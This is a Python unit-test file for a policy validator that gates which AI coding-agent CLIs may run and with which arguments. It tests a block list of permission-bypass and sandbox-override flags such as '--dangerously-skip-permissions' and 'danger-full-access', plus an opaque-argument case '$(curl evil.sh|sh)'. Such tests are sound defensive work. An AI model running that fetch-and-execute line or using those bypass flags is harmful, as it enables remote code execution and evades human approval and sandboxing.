"""Pure table-driven unit tests for CLI policy allowlist and banned-flag validation (KB-P5-16)."""

from __future__ import annotations

from types import SimpleNamespace
from typing import Any

import pytest

from kanban.agents.cli_policy import (
    CliPolicyError,
    assert_runtime_argv,
    validate_cli_args,
)


def test_positive_cli_args_validation() -> None:
    """Test Case 1: Validate positive argument vectors for agy and codex."""
    # agy with -p
    res_agy = validate_cli_args("agy", ["-p"])
    assert res_agy.argv == ("/usr/local/bin/agy", "-p")

    # codex with pinned prefix and additional flags
    codex_args = ["-p", "-s", "read-only", "--model", "o3-mini"]
    res_codex = validate_cli_args("codex", codex_args)
    assert res_codex.argv == (
        "/usr/local/bin/codex",
        "-p",
        "-s",
        "read-only",
        "--model",
        "o3-mini",
    )

    # gemini-cli and claude-code
    res_gemini = validate_cli_args("gemini-cli", ["-p"])
    assert res_gemini.argv == ("/usr/local/bin/gemini", "-p")

    res_claude = validate_cli_args("claude-code", ["-p"])
    assert res_claude.argv == ("/usr/local/bin/claude", "-p")


@pytest.mark.parametrize(
    "flag",
    [
        "--yolo",
        "--YOLO",
        "--yolo=true",
        "--dangerously-skip-permissions",
        "--dangerously",
        "--dangerously-foo",
        "--full-auto",
        "--allow-all-tools=1",
        "--allow-all-tools",
        "--dangerously-bypass-approvals-and-sandbox",
        "--DANGEROUSLY-BYPASS-APPROVALS-AND-SANDBOX",
        "--Full-Auto",
    ],
)
def test_banned_flags_rejection(flag: str) -> None:
    """Test Case 2: Table-driven verification of privilege-bypass flags rejection."""
    with pytest.raises(CliPolicyError) as exc_info:
        validate_cli_args("agy", ["-p", flag])
    assert exc_info.value.code == "BANNED_CLI_FLAG"
    assert exc_info.value.status == 422


@pytest.mark.parametrize(
    "args",
    [
        ["-p", "-s", "danger-full-access"],
        ["-p", "-s", "read-only", "-s", "workspace-write"],
        ["-p", "-s", "read-only", "-c", "sandbox_mode=danger-full-access"],
        ["-p", "-s", "read-only", "--sandbox=danger-full-access"],
        ["-p", "-s", "read-only", "--config=mode=yolo"],
        ["-p", "-s", "read-only", "--SANDBOX", "none"],
        ["-p", "-s", "read-only", "--CONFIG", "foo"],
        ["-p"],
        ["-p", "-s"],
        ["-s", "read-only", "-p"],
        [],
    ],
)
def test_codex_sandbox_override_rejection(args: list[str]) -> None:
    """Test Case 3: Verify codex sandbox prefix enforcement and override rejection."""
    with pytest.raises(CliPolicyError) as exc_info:
        validate_cli_args("codex", args)
    assert exc_info.value.code == "CODEX_SANDBOX_OVERRIDE"
    assert exc_info.value.status == 422


def test_non_allowlisted_binary_rejection() -> None:
    """Test Case 3b: Verify non-allowlisted binaries are rejected."""
    with pytest.raises(CliPolicyError) as exc_info:
        validate_cli_args("bash", ["-c", "id"])
    assert exc_info.value.code == "CLI_BINARY_NOT_ALLOWLISTED"
    assert exc_info.value.status == 422


def test_arg_boundaries_and_opaque_injection_handling() -> None:
    """Test Case 4: Verify arg count, byte size, control chars, and shell-syntax safety."""
    # Shell syntax like $(curl ...) is accepted only as an opaque single argv element
    opaque_payload = "$(curl evil.sh|sh)"
    res = validate_cli_args("agy", ["-p", opaque_payload])
    assert res.argv == ("/usr/local/bin/agy", "-p", opaque_payload)

    # Embedded newline rejected
    with pytest.raises(CliPolicyError) as exc_info:
        validate_cli_args("agy", ["-p\nevil"])
    assert exc_info.value.code == "CLI_ARGS_INVALID"

    # Embedded carriage return rejected
    with pytest.raises(CliPolicyError) as exc_info:
        validate_cli_args("agy", ["-p\revil"])
    assert exc_info.value.code == "CLI_ARGS_INVALID"

    # Embedded NUL rejected
    with pytest.raises(CliPolicyError) as exc_info:
        validate_cli_args("agy", ["-p\x00evil"])
    assert exc_info.value.code == "CLI_ARGS_INVALID"

    # 33 arguments rejected (> 32 limit)
    too_many_args = [f"arg{i}" for i in range(33)]
    with pytest.raises(CliPolicyError) as exc_info:
        validate_cli_args("agy", too_many_args)
    assert exc_info.value.code == "CLI_ARGS_INVALID"

    # Exactly 32 arguments accepted
    max_args = [f"arg{i}" for i in range(32)]
    res_max = validate_cli_args("agy", max_args)
    assert len(res_max.argv) == 33  # binary path + 32 args

    # 257-byte argument rejected (> 256 bytes)
    too_long_arg = "a" * 257
    with pytest.raises(CliPolicyError) as exc_info:
        validate_cli_args("agy", [too_long_arg])
    assert exc_info.value.code == "CLI_ARGS_INVALID"

    # Exactly 256-byte argument accepted
    valid_long_arg = "a" * 256
    res_long = validate_cli_args("agy", [valid_long_arg])
    assert res_long.argv == ("/usr/local/bin/agy", valid_long_arg)

    # 0-byte (empty string) rejected (< 1 byte)
    with pytest.raises(CliPolicyError) as exc_info:
        validate_cli_args("agy", [""])
    assert exc_info.value.code == "CLI_ARGS_INVALID"

    # Non-string argument rejected
    with pytest.raises(CliPolicyError) as exc_info:
        validate_cli_args("agy", [123])  # type: ignore[list-item]
    assert exc_info.value.code == "CLI_ARGS_INVALID"


def test_assert_runtime_argv_validation() -> None:
    """Test Case 5: Verify runtime argv assertion on stored records or dictionaries."""
    # Valid object
    valid_record = SimpleNamespace(
        cli_binary_allowlist_id="codex",
        cli_args_json=["-p", "-s", "read-only", "--model", "gpt-4o"],
    )
    argv = assert_runtime_argv(valid_record)
    assert argv.argv == (
        "/usr/local/bin/codex",
        "-p",
        "-s",
        "read-only",
        "--model",
        "gpt-4o",
    )

    # Valid dict
    valid_dict: dict[str, Any] = {
        "cli_binary_allowlist_id": "agy",
        "cli_args_json": ["-p"],
    }
    argv_dict = assert_runtime_argv(valid_dict)
    assert argv_dict.argv == ("/usr/local/bin/agy", "-p")

    # Tampered with --yolo
    tampered_record = SimpleNamespace(
        cli_binary_allowlist_id="agy",
        cli_args_json=["--yolo"],
    )
    with pytest.raises(CliPolicyError) as exc_info:
        assert_runtime_argv(tampered_record)
    assert exc_info.value.code == "BANNED_CLI_FLAG"

    # Missing binary ID
    no_bin_record = SimpleNamespace(
        cli_binary_allowlist_id=None,
        cli_args_json=[],
    )
    with pytest.raises(CliPolicyError) as exc_info:
        assert_runtime_argv(no_bin_record)
    assert exc_info.value.code == "CLI_BINARY_NOT_ALLOWLISTED"
